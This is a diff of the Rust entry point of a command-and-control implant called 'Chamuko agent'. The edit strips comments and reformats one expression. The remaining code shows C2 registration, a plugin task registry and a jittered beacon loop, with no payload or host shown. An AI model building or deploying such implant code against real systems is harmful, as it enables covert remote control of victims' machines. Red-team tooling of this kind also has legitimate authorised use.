@@ -1,10 +1,3 @@
-//! Chamuko agent entry point.
-//!
-//! The agent registers with the configured C2, then loops: sleep (with
-//! jitter), beacon for tasks, execute each task via the plugin registry, and
-//! push results back. Configuration can be embedded at compile time (by the
-//! builder) or overridden at runtime via CLI flags.
-
 use std::env;
 use std::process::ExitCode;
 use std::time::Duration;
@@ -19,8 +12,6 @@ mod commands;
 use client::C2Client;
 use commands::CoreCommands;
 
-/// Agent configuration. Compile-time defaults come from env vars set by the
-/// builder; runtime CLI flags override them.
 struct Config {
     c2_url: String,
     sleep: u64,
@@ -162,7 +153,6 @@ fn execute_task(
 fn main() -> ExitCode {
     let config = Config::from_args();
 
-    // Build plugin registry and register the built-in command plugin.
     let mut registry = PluginRegistry::new();
     let core = CoreCommands::new();
     if let Err(e) = registry.register(Box::new(core)) {
@@ -186,14 +176,11 @@ fn main() -> ExitCode {
 
     let client = C2Client::new(config.c2_url.clone());
 
-    // Register with the C2.
     let mut info = AgentInfo::local(config.name.clone());
     let id = match client.register(&info) {
         Ok(resp) => {
             info.id = resp.id.clone();
-            info
-                .id
-                .clone()
+            info.id.clone()
         }
         Err(e) => {
             eprintln!("registration failed: {e}");
@@ -206,7 +193,6 @@ fn main() -> ExitCode {
     };
     eprintln!("registered as agent {id}");
 
-    // Beacon loop.
     loop {
         jitter_sleep(config.sleep, config.jitter);
 
